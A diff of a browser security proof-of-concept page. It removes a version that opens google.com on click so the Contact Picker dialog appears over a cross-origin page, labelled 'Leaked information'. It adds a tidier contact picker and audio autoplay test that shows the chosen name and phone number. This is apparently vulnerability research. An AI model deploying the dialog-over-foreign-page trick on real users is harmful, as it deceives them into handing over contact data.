@@ -1,28 +1,190 @@
+
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <title>PoC</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <script>
-            onclick = async () => {
-                (async () => {
-                    let contacts = await navigator.contacts.select(["name"], {});
-                    document.write(`
-                        <h1>
-                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
-                        </h1>
-                    `);
-                })();
-                open("https://www.google.com", "PoC", "_blank");
-            }
-        </script>
-    </head>  
-    <body>
-        <br><br><br>
-        <center>
-            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
-        </center>
-    </body>
-  </body>
+<head>
+    <title>Contact Picker + Audio Policy PoC</title>
+    <meta charset="utf-8">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        button {
+            padding: 13px 22px;
+            border: none;
+            border-radius: 8px;
+            background: #1677ff;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 5px;
+        }
+
+        #result {
+            display: none;
+            margin: 25px auto;
+            padding: 20px;
+            max-width: 400px;
+            background: #f4f4f4;
+            border-radius: 12px;
+            overflow-wrap: anywhere;
+        }
+
+        .name {
+            color: #1677ff;
+            font-weight: bold;
+            font-size: 22px;
+        }
+
+        .phone {
+            color: #d32f2f;
+            font-size: 18px;
+        }
+    </style>
+</head>
+
+<body>
+
+<h1>Contact Picker PoC</h1>
+
+<p>
+    Contact Picker and Web Audio autoplay policy test.
+</p>
+
+<button id="startButton">
+    Start PoC
+</button>
+
+<div id="result">
+
+    <h2>Selected Contact</h2>
+
+    <p>Contact Name:</p>
+    <div class="name" id="contactName"></div>
+
+    <p>Phone Number:</p>
+    <div class="phone" id="contactPhone"></div>
+
+    <p id="audioStatus"></p>
+
+    <button id="redirectButton">
+        Open Google
+    </button>
+
+</div>
+
+<script>
+let audioContext;
+
+async function playTestTone() {
+
+    try {
+
+        audioContext = new (
+            window.AudioContext ||
+            window.webkitAudioContext
+        )();
+
+        await audioContext.resume();
+
+        const oscillator =
+            audioContext.createOscillator();
+
+        const gain =
+            audioContext.createGain();
+
+        oscillator.type = "sine";
+        oscillator.frequency.value = 880;
+
+        gain.gain.setValueAtTime(
+            0.08,
+            audioContext.currentTime
+        );
+
+        gain.gain.exponentialRampToValueAtTime(
+            0.001,
+            audioContext.currentTime + 0.2
+        );
+
+        oscillator.connect(gain);
+        gain.connect(audioContext.destination);
+
+        oscillator.start();
+
+        oscillator.stop(
+            audioContext.currentTime + 0.2
+        );
+
+        document.getElementById("audioStatus")
+            .textContent = "Audio test started.";
+
+    } catch (error) {
+
+        document.getElementById("audioStatus")
+            .textContent = "Audio blocked: " + error.message;
+
+    }
+}
+
+document.getElementById("startButton")
+.addEventListener("click", async () => {
+
+    // Audio test initiated by user interaction.
+    const audioPromise = playTestTone();
+
+    if (!("contacts" in navigator)) {
+        alert("Contact Picker is not supported.");
+        await audioPromise;
+        return;
+    }
+
+    try {
+
+        const contacts =
+            await navigator.contacts.select(
+                ["name", "tel"],
+                { multiple: false }
+            );
+
+        if (!contacts.length) return;
+
+        const contact = contacts[0];
+
+        document.getElementById("contactName")
+            .textContent =
+            contact.name?.[0] || "Unknown";
+
+        document.getElementById("contactPhone")
+            .textContent =
+            contact.tel?.[0] || "Unavailable";
+
+        document.getElementById("result")
+            .style.display = "block";
+
+    } catch (error) {
+
+        console.error(error);
+
+    }
+
+    await audioPromise;
+
+});
+
+document.getElementById("redirectButton")
+.addEventListener("click", () => {
+
+    window.location.assign(
+        "https://www.google.com"
+    );
+
+});
+</script>
+
+</body>
 </html>
